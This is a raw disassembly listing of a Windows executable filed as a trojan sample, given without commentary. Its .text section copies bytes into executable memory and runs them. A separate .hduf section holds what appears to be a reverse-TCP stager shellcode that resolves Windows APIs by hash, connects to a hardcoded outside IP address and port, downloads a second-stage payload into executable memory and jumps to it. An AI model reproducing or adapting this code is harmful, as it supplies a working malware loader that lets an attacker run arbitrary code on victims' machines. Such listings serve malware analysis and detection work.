
malware_samples/trojan/4a11ea482ea89ea668b3dab55d9435b0ab0442fbe8703094d031faa32dc569cb.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	49 c7 c1 40 00 00 00 	mov    $0x40,%r9
   14000100b:	49 c7 c0 00 30 00 00 	mov    $0x3000,%r8
   140001012:	48 c7 c2 00 10 00 00 	mov    $0x1000,%rdx
   140001019:	48 33 c9             	xor    %rcx,%rcx
   14000101c:	e8 27 10 00 00       	call   0x140002048
   140001021:	48 c7 c1 00 10 00 00 	mov    $0x1000,%rcx
   140001028:	48 be 41 10 00 40 01 	movabs $0x140001041,%rsi
   14000102f:	00 00 00 
   140001032:	48 8b f8             	mov    %rax,%rdi
   140001035:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001037:	ff d0                	call   *%rax
   140001039:	48 33 c9             	xor    %rcx,%rcx
   14000103c:	e8 01 10 00 00       	call   0x140002042
   140001041:	50                   	push   %rax
   140001042:	41 59                	pop    %r9
   140001044:	4c                   	rex.WR
   140001045:	4f                   	rex.WRXB
   140001046:	41                   	rex.B
   140001047:	44 3a 00             	cmp    (%rax),%r8b
	...
   14000203e:	00 00                	add    %al,(%rax)
   140002040:	00 cc                	add    %cl,%ah
   140002042:	ff 25 c0 0f 00 00    	jmp    *0xfc0(%rip)        # 0x140003008
   140002048:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x140003000

Disassembly of section .hduf:

0000000140004000 <.hduf>:
   140004000:	fc                   	cld
   140004001:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   140004005:	e8 cc 00 00 00       	call   0x1400040d6
   14000400a:	41 51                	push   %r9
   14000400c:	41 50                	push   %r8
   14000400e:	52                   	push   %rdx
   14000400f:	51                   	push   %rcx
   140004010:	48 31 d2             	xor    %rdx,%rdx
   140004013:	65 48 8b 52 60       	mov    %gs:0x60(%rdx),%rdx
   140004018:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   14000401c:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140004020:	56                   	push   %rsi
   140004021:	4d 31 c9             	xor    %r9,%r9
   140004024:	48 0f b7 4a 4a       	movzwq 0x4a(%rdx),%rcx
   140004029:	48 8b 72 50          	mov    0x50(%rdx),%rsi
   14000402d:	48 31 c0             	xor    %rax,%rax
   140004030:	ac                   	lods   (%rsi),%al
   140004031:	3c 61                	cmp    $0x61,%al
   140004033:	7c 02                	jl     0x140004037
   140004035:	2c 20                	sub    $0x20,%al
   140004037:	41 c1 c9 0d          	ror    $0xd,%r9d
   14000403b:	41 01 c1             	add    %eax,%r9d
   14000403e:	e2 ed                	loop   0x14000402d
   140004040:	52                   	push   %rdx
   140004041:	41 51                	push   %r9
   140004043:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140004047:	8b 42 3c             	mov    0x3c(%rdx),%eax
   14000404a:	48 01 d0             	add    %rdx,%rax
   14000404d:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140004053:	0f 85 72 00 00 00    	jne    0x1400040cb
   140004059:	8b 80 88 00 00 00    	mov    0x88(%rax),%eax
   14000405f:	48 85 c0             	test   %rax,%rax
   140004062:	74 67                	je     0x1400040cb
   140004064:	48 01 d0             	add    %rdx,%rax
   140004067:	8b 48 18             	mov    0x18(%rax),%ecx
   14000406a:	50                   	push   %rax
   14000406b:	44 8b 40 20          	mov    0x20(%rax),%r8d
   14000406f:	49 01 d0             	add    %rdx,%r8
   140004072:	e3 56                	jrcxz  0x1400040ca
   140004074:	48 ff c9             	dec    %rcx
   140004077:	41 8b 34 88          	mov    (%r8,%rcx,4),%esi
   14000407b:	4d 31 c9             	xor    %r9,%r9
   14000407e:	48 01 d6             	add    %rdx,%rsi
   140004081:	48 31 c0             	xor    %rax,%rax
   140004084:	41 c1 c9 0d          	ror    $0xd,%r9d
   140004088:	ac                   	lods   (%rsi),%al
   140004089:	41 01 c1             	add    %eax,%r9d
   14000408c:	38 e0                	cmp    %ah,%al
   14000408e:	75 f1                	jne    0x140004081
   140004090:	4c 03 4c 24 08       	add    0x8(%rsp),%r9
   140004095:	45 39 d1             	cmp    %r10d,%r9d
   140004098:	75 d8                	jne    0x140004072
   14000409a:	58                   	pop    %rax
   14000409b:	44 8b 40 24          	mov    0x24(%rax),%r8d
   14000409f:	49 01 d0             	add    %rdx,%r8
   1400040a2:	66 41 8b 0c 48       	mov    (%r8,%rcx,2),%cx
   1400040a7:	44 8b 40 1c          	mov    0x1c(%rax),%r8d
   1400040ab:	49 01 d0             	add    %rdx,%r8
   1400040ae:	41 8b 04 88          	mov    (%r8,%rcx,4),%eax
   1400040b2:	48 01 d0             	add    %rdx,%rax
   1400040b5:	41 58                	pop    %r8
   1400040b7:	41 58                	pop    %r8
   1400040b9:	5e                   	pop    %rsi
   1400040ba:	59                   	pop    %rcx
   1400040bb:	5a                   	pop    %rdx
   1400040bc:	41 58                	pop    %r8
   1400040be:	41 59                	pop    %r9
   1400040c0:	41 5a                	pop    %r10
   1400040c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400040c6:	41 52                	push   %r10
   1400040c8:	ff e0                	jmp    *%rax
   1400040ca:	58                   	pop    %rax
   1400040cb:	41 59                	pop    %r9
   1400040cd:	5a                   	pop    %rdx
   1400040ce:	48 8b 12             	mov    (%rdx),%rdx
   1400040d1:	e9 4b ff ff ff       	jmp    0x140004021
   1400040d6:	5d                   	pop    %rbp
   1400040d7:	49 be 77 73 32 5f 33 	movabs $0x32335f327377,%r14
   1400040de:	32 00 00 
   1400040e1:	41 56                	push   %r14
   1400040e3:	49 89 e6             	mov    %rsp,%r14
   1400040e6:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400040ed:	49 89 e5             	mov    %rsp,%r13
   1400040f0:	49 bc 02 00 56 6f 40 	movabs $0xca5034406f560002,%r12
   1400040f7:	34 50 ca 
   1400040fa:	41 54                	push   %r12
   1400040fc:	49 89 e4             	mov    %rsp,%r12
   1400040ff:	4c 89 f1             	mov    %r14,%rcx
   140004102:	41 ba 4c 77 26 07    	mov    $0x726774c,%r10d
   140004108:	ff d5                	call   *%rbp
   14000410a:	4c 89 ea             	mov    %r13,%rdx
   14000410d:	68 01 01 00 00       	push   $0x101
   140004112:	59                   	pop    %rcx
   140004113:	41 ba 29 80 6b 00    	mov    $0x6b8029,%r10d
   140004119:	ff d5                	call   *%rbp
   14000411b:	6a 0a                	push   $0xa
   14000411d:	41 5e                	pop    %r14
   14000411f:	50                   	push   %rax
   140004120:	50                   	push   %rax
   140004121:	4d 31 c9             	xor    %r9,%r9
   140004124:	4d 31 c0             	xor    %r8,%r8
   140004127:	48 ff c0             	inc    %rax
   14000412a:	48 89 c2             	mov    %rax,%rdx
   14000412d:	48 ff c0             	inc    %rax
   140004130:	48 89 c1             	mov    %rax,%rcx
   140004133:	41 ba ea 0f df e0    	mov    $0xe0df0fea,%r10d
   140004139:	ff d5                	call   *%rbp
   14000413b:	48 89 c7             	mov    %rax,%rdi
   14000413e:	6a 10                	push   $0x10
   140004140:	41 58                	pop    %r8
   140004142:	4c 89 e2             	mov    %r12,%rdx
   140004145:	48 89 f9             	mov    %rdi,%rcx
   140004148:	41 ba 99 a5 74 61    	mov    $0x6174a599,%r10d
   14000414e:	ff d5                	call   *%rbp
   140004150:	85 c0                	test   %eax,%eax
   140004152:	74 0a                	je     0x14000415e
   140004154:	49 ff ce             	dec    %r14
   140004157:	75 e5                	jne    0x14000413e
   140004159:	e8 93 00 00 00       	call   0x1400041f1
   14000415e:	48 83 ec 10          	sub    $0x10,%rsp
   140004162:	48 89 e2             	mov    %rsp,%rdx
   140004165:	4d 31 c9             	xor    %r9,%r9
   140004168:	6a 04                	push   $0x4
   14000416a:	41 58                	pop    %r8
   14000416c:	48 89 f9             	mov    %rdi,%rcx
   14000416f:	41 ba 02 d9 c8 5f    	mov    $0x5fc8d902,%r10d
   140004175:	ff d5                	call   *%rbp
   140004177:	83 f8 00             	cmp    $0x0,%eax
   14000417a:	7e 55                	jle    0x1400041d1
   14000417c:	48 83 c4 20          	add    $0x20,%rsp
   140004180:	5e                   	pop    %rsi
   140004181:	89 f6                	mov    %esi,%esi
   140004183:	6a 40                	push   $0x40
   140004185:	41 59                	pop    %r9
   140004187:	68 00 10 00 00       	push   $0x1000
   14000418c:	41 58                	pop    %r8
   14000418e:	48 89 f2             	mov    %rsi,%rdx
   140004191:	48 31 c9             	xor    %rcx,%rcx
   140004194:	41 ba 58 a4 53 e5    	mov    $0xe553a458,%r10d
   14000419a:	ff d5                	call   *%rbp
   14000419c:	48 89 c3             	mov    %rax,%rbx
   14000419f:	49 89 c7             	mov    %rax,%r15
   1400041a2:	4d 31 c9             	xor    %r9,%r9
   1400041a5:	49 89 f0             	mov    %rsi,%r8
   1400041a8:	48 89 da             	mov    %rbx,%rdx
   1400041ab:	48 89 f9             	mov    %rdi,%rcx
   1400041ae:	41 ba 02 d9 c8 5f    	mov    $0x5fc8d902,%r10d
   1400041b4:	ff d5                	call   *%rbp
   1400041b6:	83 f8 00             	cmp    $0x0,%eax
   1400041b9:	7d 28                	jge    0x1400041e3
   1400041bb:	58                   	pop    %rax
   1400041bc:	41 57                	push   %r15
   1400041be:	59                   	pop    %rcx
   1400041bf:	68 00 40 00 00       	push   $0x4000
   1400041c4:	41 58                	pop    %r8
   1400041c6:	6a 00                	push   $0x0
   1400041c8:	5a                   	pop    %rdx
   1400041c9:	41 ba 0b 2f 0f 30    	mov    $0x300f2f0b,%r10d
   1400041cf:	ff d5                	call   *%rbp
   1400041d1:	57                   	push   %rdi
   1400041d2:	59                   	pop    %rcx
   1400041d3:	41 ba 75 6e 4d 61    	mov    $0x614d6e75,%r10d
   1400041d9:	ff d5                	call   *%rbp
   1400041db:	49 ff ce             	dec    %r14
   1400041de:	e9 3c ff ff ff       	jmp    0x14000411f
   1400041e3:	48 01 c3             	add    %rax,%rbx
   1400041e6:	48 29 c6             	sub    %rax,%rsi
   1400041e9:	48 85 f6             	test   %rsi,%rsi
   1400041ec:	75 b4                	jne    0x1400041a2
   1400041ee:	41 ff e7             	jmp    *%r15
   1400041f1:	58                   	pop    %rax
   1400041f2:	6a 00                	push   $0x0
   1400041f4:	59                   	pop    %rcx
   1400041f5:	49 c7 c2 f0 b5 a2 56 	mov    $0x56a2b5f0,%r10
   1400041fc:	ff d5                	call   *%rbp
   1400041fe:	00 00                	add    %al,(%rax)
   140004200:	28 42 00             	sub    %al,0x0(%rdx)
   140004203:	00 00                	add    %al,(%rax)
   140004205:	00 00                	add    %al,(%rax)
   140004207:	00 ff                	add    %bh,%bh
   140004209:	ff                   	(bad)
   14000420a:	ff                   	(bad)
   14000420b:	ff 40 42             	incl   0x42(%rax)
   14000420e:	00 00                	add    %al,(%rax)
   140004210:	00 30                	add    %dh,(%rax)
	...
   140004226:	00 00                	add    %al,(%rax)
   140004228:	4e                   	rex.WRX
   140004229:	42 00 00             	rex.X add %al,(%rax)
   14000422c:	00 00                	add    %al,(%rax)
   14000422e:	00 00                	add    %al,(%rax)
   140004230:	5e                   	pop    %rsi
   140004231:	42 00 00             	rex.X add %al,(%rax)
	...
   140004240:	4b                   	rex.WXB
   140004241:	45 52                	rex.RB push %r10
   140004243:	4e                   	rex.WRX
   140004244:	45                   	rex.RB
   140004245:	4c 33 32             	xor    (%rdx),%r14
   140004248:	2e 64 6c             	cs fs insb (%dx),(%rdi)
   14000424b:	6c                   	insb   (%dx),(%rdi)
   14000424c:	00 00                	add    %al,(%rax)
   14000424e:	58                   	pop    %rax
   14000424f:	04 56                	add    $0x56,%al
   140004251:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%rdx),%esi
   140004258:	6c                   	insb   (%dx),(%rdi)
   140004259:	6c                   	insb   (%dx),(%rdi)
   14000425a:	6f                   	outsl  (%rsi),(%dx)
   14000425b:	63 00                	movsxd (%rax),%eax
   14000425d:	00 05 01 45 78 69    	add    %al,0x69784501(%rip)        # 0x1a9788764
   140004263:	74 50                	je     0x1400042b5
   140004265:	72 6f                	jb     0x1400042d6
   140004267:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000426a:	73 00                	jae    0x14000426c
	...
   140004274:	08 00                	or     %al,(%rax)
	...
